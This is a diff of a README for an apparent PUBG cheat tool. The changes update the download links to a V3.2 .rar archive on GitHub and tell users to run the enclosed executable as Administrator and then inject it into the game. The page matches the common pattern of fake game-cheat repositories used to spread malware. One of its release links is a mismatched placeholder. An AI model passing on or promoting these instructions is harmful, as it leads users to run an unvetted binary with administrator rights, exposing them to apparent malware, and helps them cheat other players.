@@ -31,11 +31,11 @@
 
 ---
 
-### ⬇️ [Download](https://github.com/savagedragonrevive7/PUBG-External/releases/download/PUBG.V3.1/PUBG.V3.1.rar)
+### ⬇️ [Download](https://github.com/savagedragonrevive7/PUBG-External/releases/download/PUBG.V3.2/PUBG.V3.2.rar)
 
 Get the latest release from the **[Releases](https://github.com/yourname/pubg-toolkit/releases/latest)** tab.
 
-[![Download Now](https://img.shields.io/badge/Download-Now-green?style=for-the-badge&logo=github)](https://github.com/savagedragonrevive7/PUBG-External/releases/download/PUBG.V3.1/PUBG.V3.1.rar)
+[![Download Now](https://img.shields.io/badge/Download-Now-green?style=for-the-badge&logo=github)](https://github.com/savagedragonrevive7/PUBG-External/releases/download/PUBG.V3.2/PUBG.V3.2.rar)
 
 ---
 
@@ -87,7 +87,7 @@ Download the latest release package from the **Releases** tab or the download li
 Extract all contents of the archive into a single folder on your desktop.
 
 **3. Run Loader**
-Run the `PUBG.V3.1.exe` executable as **Administrator**.
+Run the `PUBG.V3.2.exe` executable as **Administrator**.
 
 **4. Launch & Inject**
 Start PUBG, enter a match, and press `INSERT` or `DELETE` to open the in-game menu.
